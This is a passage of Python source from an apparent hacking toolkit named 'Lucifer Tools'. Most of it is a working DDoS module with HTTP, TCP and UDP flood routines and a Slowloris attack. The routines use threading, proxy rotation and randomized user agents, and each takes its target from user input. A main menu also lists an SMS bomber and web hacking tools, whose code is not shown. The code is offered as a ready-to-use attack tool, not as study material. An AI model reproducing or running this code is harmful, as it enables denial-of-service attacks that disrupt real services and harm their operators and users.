        """Get random proxy from loaded proxies"""
        if self.proxies:
            return random.choice(self.proxies)
        return None

    def get_random_user_agent(self):
        """Get random user agent"""
        return random.choice(self.user_agents)

    def http_flood(self, target, duration, threads_count):
        """HTTP Flood Attack"""
        print(f"\n{CYAN}[=== HTTP FLOOD ATTACK ===]{RESET}")
        print(f"{GREEN}[*] Target: {target}{RESET}")
        print(f"{GREEN}[*] Duration: {duration} seconds{RESET}")
        print(f"{GREEN}[*] Threads: {threads_count}{RESET}")
        print(f"{GREEN}[*] Proxies: {len(self.proxies)}{RESET}")
        print(f"{YELLOW}[!] Attack starting in 3 seconds...{RESET}")
        time.sleep(3)

        self.attack_running = True
        self.requests_sent = 0
        start_time = time.time()

        def attack_thread():
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    proxy = self.get_random_proxy()
                    headers = {
                        'User-Agent': self.get_random_user_agent(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache'
                    }

                    if proxy:
                        response = requests.get(target, headers=headers, proxies=proxy, timeout=5)
                    else:
                        response = requests.get(target, headers=headers, timeout=5)

                    self.requests_sent += 1
                    print(f"{GREEN}[+] Request #{self.requests_sent} - Status: {response.status_code}{RESET}", end='\r')

                except Exception as e:
                    self.requests_sent += 1
                    print(f"{RED}[-] Request #{self.requests_sent} - Failed: {str(e)[:50]}{RESET}", end='\r')

        # Start threads
        threads = []
        for _ in range(threads_count):
            thread = threading.Thread(target=attack_thread)
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor attack
        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                rps = self.requests_sent / elapsed if elapsed > 0 else 0
                print(f"{YELLOW}[*] Elapsed: {elapsed:.1f}s | Requests: {self.requests_sent} | RPS: {rps:.1f}{RESET}",
                      end='\r')
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time
        print(f"\n{GREEN}[+] Attack completed!{RESET}")
        print(f"{GREEN}[+] Total requests: {self.requests_sent}{RESET}")
        print(f"{GREEN}[+] Total time: {total_time:.1f} seconds{RESET}")
        print(f"{GREEN}[+] Average RPS: {self.requests_sent / total_time:.1f}{RESET}")

    def tcp_flood(self, target, port, duration, threads_count):
        """TCP Flood Attack"""
        print(f"\n{CYAN}[=== TCP FLOOD ATTACK ===]{RESET}")
        print(f"{GREEN}[*] Target: {target}:{port}{RESET}")
        print(f"{GREEN}[*] Duration: {duration} seconds{RESET}")
        print(f"{GREEN}[*] Threads: {threads_count}{RESET}")
        print(f"{YELLOW}[!] Attack starting in 3 seconds...{RESET}")
        time.sleep(3)

        self.attack_running = True
        self.requests_sent = 0
        start_time = time.time()

        def attack_thread():
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, port))

                    # Send random data
                    data = os.urandom(1024)
                    sock.send(data)
                    sock.close()

                    self.requests_sent += 1
                    print(f"{GREEN}[+] TCP Packet #{self.requests_sent} sent{RESET}", end='\r')

                except Exception as e:
                    self.requests_sent += 1
                    print(f"{RED}[-] TCP Packet #{self.requests_sent} failed{RESET}", end='\r')

        # Start threads
        threads = []
        for _ in range(threads_count):
            thread = threading.Thread(target=attack_thread)
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor attack
        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                pps = self.requests_sent / elapsed if elapsed > 0 else 0
                print(f"{YELLOW}[*] Elapsed: {elapsed:.1f}s | Packets: {self.requests_sent} | PPS: {pps:.1f}{RESET}",
                      end='\r')
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time
        print(f"\n{GREEN}[+] Attack completed!{RESET}")
        print(f"{GREEN}[+] Total packets: {self.requests_sent}{RESET}")
        print(f"{GREEN}[+] Total time: {total_time:.1f} seconds{RESET}")
        print(f"{GREEN}[+] Average PPS: {self.requests_sent / total_time:.1f}{RESET}")

    def udp_flood(self, target, port, duration, threads_count):
        """UDP Flood Attack"""
        print(f"\n{CYAN}[=== UDP FLOOD ATTACK ===]{RESET}")
        print(f"{GREEN}[*] Target: {target}:{port}{RESET}")
        print(f"{GREEN}[*] Duration: {duration} seconds{RESET}")
        print(f"{GREEN}[*] Threads: {threads_count}{RESET}")
        print(f"{YELLOW}[!] Attack starting in 3 seconds...{RESET}")
        time.sleep(3)

        self.attack_running = True
        self.requests_sent = 0
        start_time = time.time()

        def attack_thread():
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                    # Send random UDP data
                    data = os.urandom(512)
                    sock.sendto(data, (target, port))
                    sock.close()

                    self.requests_sent += 1
                    print(f"{GREEN}[+] UDP Packet #{self.requests_sent} sent{RESET}", end='\r')

                except Exception as e:
                    self.requests_sent += 1
                    print(f"{RED}[-] UDP Packet #{self.requests_sent} failed{RESET}", end='\r')

        # Start threads
        threads = []
        for _ in range(threads_count):
            thread = threading.Thread(target=attack_thread)
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor attack
        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                pps = self.requests_sent / elapsed if elapsed > 0 else 0
                print(f"{YELLOW}[*] Elapsed: {elapsed:.1f}s | Packets: {self.requests_sent} | PPS: {pps:.1f}{RESET}",
                      end='\r')
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time
        print(f"\n{GREEN}[+] Attack completed!{RESET}")
        print(f"{GREEN}[+] Total packets: {self.requests_sent}{RESET}")
        print(f"{GREEN}[+] Total time: {total_time:.1f} seconds{RESET}")
        print(f"{GREEN}[+] Average PPS: {self.requests_sent / total_time:.1f}{RESET}")

    def slowloris_attack(self, target, duration, threads_count):
        """Slowloris Attack"""
        print(f"\n{CYAN}[=== SLOWLORIS ATTACK ===]{RESET}")
        print(f"{GREEN}[*] Target: {target}{RESET}")
        print(f"{GREEN}[*] Duration: {duration} seconds{RESET}")
        print(f"{GREEN}[*] Threads: {threads_count}{RESET}")
        print(f"{YELLOW}[!] Attack starting in 3 seconds...{RESET}")
        time.sleep(3)

        self.attack_running = True
        self.requests_sent = 0
        start_time = time.time()

        def attack_thread():
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    # Create partial HTTP requests
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((target, 80))

                    # Send partial request headers
                    headers = f"GET / HTTP/1.1\r\nHost: {target}\r\n"
                    headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                    headers += "Content-Length: 42\r\n"

                    sock.send(headers.encode())
                    self.requests_sent += 1

                    # Keep connection open
                    while self.attack_running and (time.time() - start_time) < duration:
                        time.sleep(10)
                        sock.send(b"X-a: b\r\n")

                    sock.close()

                except Exception:
                    pass

        # Start threads
        threads = []
        for _ in range(threads_count):
            thread = threading.Thread(target=attack_thread)
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor attack
        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                print(f"{YELLOW}[*] Elapsed: {elapsed:.1f}s | Connections: {threads_count}{RESET}", end='\r')
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Attack interrupted by user{RESET}")

        self.attack_running = False
        print(f"\n{GREEN}[+] Slowloris attack completed!{RESET}")

    def show_menu(self):
        """Show DDoS tools menu"""
        print(f"""
{CYAN}[1]{RESET} HTTP Flood Attack
{CYAN}[2]{RESET} TCP Flood Attack  
{CYAN}[3]{RESET} UDP Flood Attack
{CYAN}[4]{RESET} Slowloris Attack
{CYAN}[5]{RESET} Load Proxies ({len(self.proxies)} loaded)
{CYAN}[0]{RESET} Back to Main Menu
        """)

    def main(self):
        """Main DDoS tools function"""
        if not self.check_ddos_password():
            return

        self.banner()

        while True:
            self.show_menu()
            choice = input(f"{YELLOW}[?] Select attack type: {RESET}")

            if choice == '1':  # HTTP Flood
                target = input("[?] Enter target URL (http://example.com): ").strip()
                duration = int(input("[?] Enter attack duration (seconds): "))
                threads = int(input("[?] Enter threads (default 1000): ") or "1000")

                if not target.startswith(('http://', 'https://')):
                    target = 'http://' + target

                self.http_flood(target, duration, threads)

            elif choice == '2':  # TCP Flood
                target = input("[?] Enter target IP: ").strip()
                port = int(input("[?] Enter target port: "))
                duration = int(input("[?] Enter attack duration (seconds): "))
                threads = int(input("[?] Enter threads (default 1000): ") or "1000")

                self.tcp_flood(target, port, duration, threads)

            elif choice == '3':  # UDP Flood
                target = input("[?] Enter target IP: ").strip()
                port = int(input("[?] Enter target port: "))
                duration = int(input("[?] Enter attack duration (seconds): "))
                threads = int(input("[?] Enter threads (default 1000): ") or "1000")

                self.udp_flood(target, port, duration, threads)

            elif choice == '4':  # Slowloris
                target = input("[?] Enter target URL or IP: ").strip()
                duration = int(input("[?] Enter attack duration (seconds): "))
                threads = int(input("[?] Enter threads (default 500): ") or "500")

                self.slowloris_attack(target, duration, threads)

            elif choice == '5':  # Load Proxies
                self.load_proxies()

            elif choice == '0':  # Exit
                print(f"{GREEN}[+] Returning to main menu...{RESET}")
                break
            else:
                print(f"{RED}[-] Invalid choice!{RESET}")

            input(f"\n{YELLOW}Press Enter to continue...{RESET}")


# Add this function to your main menu
def ddos_tools():
    """DDoS Tools Entry Point"""
    tools = DDoSTools()
    tools.main()


def menu():
    while True:
        clear()
        banner()
        print(f"""
{CYAN}==============================
      Lucifer Tools Menu
=============================={RESET}
1. Network Scanner
2. IP Info Lookup
3. Port Scanner
4. System Info
5. File Search
6. Wordlist Generator
7. Password Strength Check
8. Website Status Check
9. Storage Usage
10. Internet Speed Test
11. Hash Generator
12. YouTube Video Info
13. Strong Password Generator
14. URL Shortener
15. Battery Status
16. Send SMS
17. Camera Capture
18. Text → PDF
19. Temp Mail Generator
20. PDF → Text
21. Clipboard Tools
22. Random MAC Generator
23. Lucifer SMS Bomber
24. Password Tools
25. Web Hacking Tools
26. Lucifer DDOS Tools
0. Exit
""")

        choice = input("Choose Option: ")

        if choice == "1":
            arp_scan()
        elif choice == "2":
            ip_lookup()
        elif choice == "3":
            port_scan()
        elif choice == "4":
            system_info()
        elif choice == "5":
            file_search()
        elif choice == "6":
            wordlist()
        elif choice == "7":
            pass_strength()
        elif choice == "8":
            web_status()
        elif choice == "9":
            storage()
        elif choice == "10":
            speed_test()
        elif choice == "11":
            hash_generate()
        elif choice == "12":
            yt_info()
        elif choice == "13":
            strong_pass()
        elif choice == "14":
            url_shortener()
        elif choice == "15":
            battery_status()
        elif choice == "16":
            sms_sender()
        elif choice == "17":
            camera_snap()
        elif choice == "18":
            text_to_pdf()
        elif choice == "19":
            temp_mail()
        elif choice == "20":
            pdf_to_text()
        elif choice == "21":
            clipboard_tools()
        elif choice == "22":
            mac_gen()
        elif choice == "23":
            Lucifer_Bomber()
        elif choice == "24":
            password_tools()
        elif choice == "25":
            web_hacking_tools()
        elif choice == "26":
            ddos_tools()
        elif choice == "0":
            clear()
            print("Goodbye Lucifer!")
            sys.exit()
        else:
            print(RED + "Invalid Option!" + RESET)

        input("\nPress Enter to return menu...")


# ----------------------------- #
# Program Entry Point
# ----------------------------- #
if __name__ == "__main__":
    # Check password before starting
    if check_password():
        menu()
    else:
        sys.exit()
